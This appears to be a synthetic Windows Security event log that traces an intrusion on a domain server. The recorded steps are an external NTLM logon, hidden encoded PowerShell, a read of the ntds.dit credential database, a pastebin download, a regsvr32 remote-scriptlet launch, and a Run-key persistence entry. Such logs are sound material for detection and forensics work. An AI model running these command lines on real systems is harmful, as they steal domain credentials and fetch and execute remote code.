May 09 11:23:14 win-srv2019-prod wineventlog: 2025-05-09T11:23:14.456Z Security 4624 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local An account was successfully logged on. Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Logon Information: Logon Type: 3 Restricted Admin Mode: - Virtual Account: No Elevated Token: No Impersonation Level: Impersonation New Logon: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013 Account Name: svc_backup Account Domain: CORP Logon ID: 0x551F3 Network Information: Workstation Name: ADMIN-LAPTOP Source Network Address: 203.0.113.45 Source Port: 60752 Process Information: Process ID: 0x0 Process Name: - Detailed Authentication Information: Logon Process: NtLmSsp Authentication Package: NTLM Transited Services: - Package Name (NTLM only): NTLM V2 Key Length: 128 This event is generated when a logon session is created. It is generated on the computer that was accessed.
May 09 11:23:17 win-srv2019-prod wineventlog: 2025-05-09T11:23:17.089Z Security 4688 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local A new process has been created. Creator Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013 Account Name: svc_backup Account Domain: CORP Logon ID: 0x551F3 Target Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x1A40 New Process Name: C:\Windows\System32\cmd.exe Token Elevation Type: %%1936 Mandatory Label: S-1-16-12288 Creator Process ID: 0x3E7 Creator Process Name: C:\Windows\System32\services.exe Process Command Line: cmd.exe /c powershell.exe -nop -w hidden -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQFPADQAQQBBAEEAQQBBAEEAQQBBAEEAQQBNAFYAWABQAFUALwBiAFMAQgBEADUAWgB2AHQATAAyAFkAegBkAGsAYgAyADUAUgBTAEUASgBnAGYAQQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAA==
May 09 11:23:19 win-srv2019-prod wineventlog: 2025-05-09T11:23:19.267Z Security 4663 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local An attempt was made to access an object. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013 Account Name: svc_backup Account Domain: CORP Logon ID: 0x551F3 Object: Object Server: Security Object Type: File Object Name: C:\Windows\NTDS\ntds.dit Process Information: Process ID: 0x1CC4 Process Name: C:\Windows\System32\powershell.exe Access Request Information: Accesses: READ_CONTROL SYNCHRONIZE ReadData (or ListDirectory) ReadEA ReadAttributes Access Mask: 0x120089
May 09 11:23:25 win-srv2019-prod wineventlog: 2025-05-09T11:23:25.821Z Security 5156 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 4548 Application Name: \device\harddiskvolume2\windows\system32\powershell.exe Network Information: Direction: Outbound Source Address: 10.1.5.25 Source Port: 55214 Destination Address: 198.51.100.72 Destination Port: 443 Protocol: 6 Filter Information: Filter Run-Time ID: 86312 Layer Name: Connect Layer Run-Time ID: 13 User: S-1-5-21-3623811015-3361044348-30300820-1013
May 09 11:23:31 win-srv2019-prod wineventlog: 2025-05-09T11:23:31.127Z Security 4104 Microsoft-Windows-PowerShell User1 N/A Audit Success WIN-SRV2019-PROD.corp.local Script block logging. ScriptBlock ID: a154ac7c-7e2d-4e6f-8f15-b02b54132456 Path: ScriptBlock text: Invoke-WebRequest -Uri 'https://pastebin.com/raw/8Jy12AB3' -OutFile 'C:\ProgramData\svc.dat' | Out-Null;$d=[System.IO.File]::ReadAllBytes('C:\ProgramData\svc.dat');Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ('regsvr32.exe /s /u /i:https://198.51.100.72/9Kjs.sct scrobj.dll')
May 09 11:23:38 win-srv2019-prod wineventlog: 2025-05-09T11:23:38.459Z Security 4688 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local A new process has been created. Creator Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013 Account Name: svc_backup Account Domain: CORP Logon ID: 0x551F3 Target Subject: Security ID: S-1-0-0 Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x2204 New Process Name: C:\Windows\System32\regsvr32.exe Token Elevation Type: %%1936 Mandatory Label: S-1-16-12288 Creator Process ID: 0x1CC4 Creator Process Name: C:\Windows\System32\powershell.exe Process Command Line: regsvr32.exe /s /u /i:https://198.51.100.72/9Kjs.sct scrobj.dll
May 09 11:23:52 win-srv2019-prod wineventlog: 2025-05-09T11:23:52.183Z Security 4657 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local A registry value was modified. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013 Account Name: svc_backup Account Domain: CORP Logon ID: 0x551F3 Object: Object Server: Security Object Type: Key Object Name: \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Process Information: Process ID: 0x2204 Process Name: C:\Windows\System32\regsvr32.exe Operation: Operation Type: Set Value New Value Type: REG_SZ New Value: C:\Windows\System32\rundll32.exe "C:\ProgramData\svc.dat",EntryPoint
May 09 11:23:59 win-srv2019-prod wineventlog: 2025-05-09T11:23:59.627Z Security 4689 Microsoft-Windows-Security-Auditing User1 N/A Audit Success WIN-SRV2019-PROD.corp.local A process has exited. Subject: Security ID: S-1-5-21-3623811015-3361044348-30300820-1013 Account Name: svc_backup Account Domain: CORP Logon ID: 0x551F3 Process Information: Process ID: 0x2204 Process Name: C:\Windows\System32\regsvr32.exe Status: 0x0
